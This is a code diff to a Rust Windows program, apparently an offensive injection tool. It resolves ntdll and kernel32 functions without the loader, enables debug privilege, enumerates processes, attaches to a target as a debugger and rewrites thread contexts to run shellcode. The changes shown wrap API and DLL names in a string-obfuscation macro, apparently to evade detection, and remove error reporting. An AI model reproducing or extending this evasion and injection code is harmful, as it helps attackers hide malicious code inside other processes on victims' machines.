@@ -1,5 +1,7 @@
 #![allow(non_camel_case_types)]
 #![allow(non_snake_case)]
+#![allow(unused_assignments)]
+#![allow(unused_variables)]
 
 use winapi::{
     shared::{
@@ -7,7 +9,7 @@ use winapi::{
         ntdef::{HANDLE, NTSTATUS},
     },
     um::{
-        errhandlingapi::GetLastError, minwinbase::{DEBUG_EVENT, LPCONTEXT}, winnt::{ACCESS_MASK, CONTEXT, MAXIMUM_ALLOWED}
+        minwinbase::{DEBUG_EVENT, LPCONTEXT}, winnt::{ACCESS_MASK, CONTEXT, MAXIMUM_ALLOWED}
     },
 };
 
@@ -200,11 +202,12 @@ fn main() {
     let teb: *const TEB = noldr::get_teb();
     println!("[+] TEB address: {:?}", teb);
 
-    let ntdll = noldr::get_dll_address("ntdll.dll".to_string(), teb).unwrap();
+    let ntdll = noldr::get_dll_address(lc!("ntdll.dll").to_string(), teb).unwrap();
     println!("[+] ntdll.dll address: {:?}", ntdll);
 
-    let kernel32 = noldr::get_dll_address("kernel32.dll".to_string(), teb).unwrap();
+    let kernel32 = noldr::get_dll_address(lc!("kernel32.dll").to_string(), teb).unwrap();
     println!("[+] kernel32.dll address: {:?}", kernel32);
+
 
     //load advapi.dll
     let advapi32 = load_dll("advapi32.dll", kernel32);
@@ -218,9 +221,10 @@ fn main() {
     elevate_debug(ntdll, kernel32, advapi32_base).unwrap();
 
     //debug the target process
-    let debug_active_process = noldr::get_function_address(kernel32, "DebugActiveProcess")
+    let debug_active_process = noldr::get_function_address(kernel32, &lc!("DebugActiveProcess"))
         .unwrap_or_else(|| std::ptr::null_mut());
     println!("[+] DebugActiveProcess address: {:?}", debug_active_process);
+
 
     let debug_active_process: DebugActiveProcessFn =
         unsafe { std::mem::transmute(debug_active_process) };
@@ -441,9 +445,8 @@ fn main() {
                         println!("[+] SetThreadContext address: {:?}", set_thread_context);
                         let set_thread_context: SetThreadContextFn = unsafe { std::mem::transmute(set_thread_context) };
                         let success = unsafe { set_thread_context(h_thread, &mut current_context) };
-                        let error = unsafe { GetLastError() };
-                        println!("[*] SetThreadContext result: {}, error: {}", success, error);
-
+                        //let error = unsafe { GetLastError() };
+                        //println!("[*] SetThreadContext result: {}, error: {}", success, error);
 
                         // Verify our changes took effect
                         let mut verify_context: CONTEXT = unsafe { std::mem::zeroed() };
@@ -468,7 +471,7 @@ fn main() {
                             );
                             println!("[*] ContinueDebugEvent result: {}", continue_result);
                             if continue_result == 0 {
-                                println!("[!] ContinueDebugEvent failed with error: {}", GetLastError());
+                                println!("[!] ContinueDebugEvent failed.");
                             }
                         }
 
@@ -518,11 +521,12 @@ fn main() {
                                     shellcode_event.dwThreadId,
                                     DBG_CONTINUE, // Try DBG_CONTINUE instead of DBG_EXCEPTION_NOT_HANDLED
                                 );
-                                println!("[*] ContinueDebugEvent result: {} (error: {})", 
-                                    continue_result, GetLastError());
+                                println!("[*] ContinueDebugEvent result: {}.", 
+                                    continue_result);
                             }
                         }
                         println!("[*] No more debug events received after 1 second timeout");
+
 
                         cpt += 1;
                     }
@@ -611,11 +615,11 @@ fn locate_process(
     ntdll: *const c_void,
     kernel32: *const c_void,
 ) -> Result<(), Box<dyn std::error::Error>> {
-    let nt_get_next_process = noldr::get_function_address(ntdll, "NtGetNextProcess")
+    let nt_get_next_process = noldr::get_function_address(ntdll, &lc!("NtGetNextProcess"))
         .unwrap_or_else(|| std::ptr::null_mut());
     println!("[+] NtGetNextProcess address: {:?}", nt_get_next_process);
 
-    let get_process_id = noldr::get_function_address(kernel32, "GetProcessId")
+    let get_process_id = noldr::get_function_address(kernel32, &lc!("GetProcessId"))
         .unwrap_or_else(|| std::ptr::null_mut());
     println!("[+] GetProcessId address: {:?}", get_process_id);
     let get_process_id: GetProcessIdFn = unsafe { std::mem::transmute(get_process_id) };
@@ -654,7 +658,7 @@ fn elevate_debug(
     advapi32: *const c_void,
 ) -> Result<(), Box<dyn std::error::Error>> {
     //locate NtOpenProcessToken
-    let nt_open_process_token = noldr::get_function_address(ntdll, "NtOpenProcessToken")
+    let nt_open_process_token = noldr::get_function_address(ntdll, &lc!("NtOpenProcessToken"))
         .unwrap_or_else(|| std::ptr::null_mut());
 
     if nt_open_process_token.is_null() {
@@ -671,7 +675,7 @@ fn elevate_debug(
 
     let mut token_handle: HANDLE = std::ptr::null_mut();
 
-    let get_current_process = noldr::get_function_address(kernel32, "GetCurrentProcess")
+    let get_current_process = noldr::get_function_address(kernel32, &lc!("GetCurrentProcess"))
         .unwrap_or_else(|| std::ptr::null_mut());
     println!("[+] GetCurrentProcess address: {:?}", get_current_process);
 
@@ -737,7 +741,7 @@ fn elevate_debug(
         }],
     };
 
-    let nt_adjust_privileges_token = noldr::get_function_address(ntdll, "NtAdjustPrivilegesToken")
+    let nt_adjust_privileges_token = noldr::get_function_address(ntdll, &lc!("NtAdjustPrivilegesToken"))
         .unwrap_or_else(|| std::ptr::null_mut());
     println!(
         "[+] NtAdjustPrivilegesToken address: {:?}",
@@ -770,7 +774,7 @@ fn elevate_debug(
 
     // After you're done with the token_handle:
     let nt_close =
-        noldr::get_function_address(ntdll, "NtClose").unwrap_or_else(|| std::ptr::null_mut());
+        noldr::get_function_address(ntdll, &lc!("NtClose")).unwrap_or_else(|| std::ptr::null_mut());
 
     let status = unsafe {
         let nt_close: NtCloseFn = std::mem::transmute(nt_close);
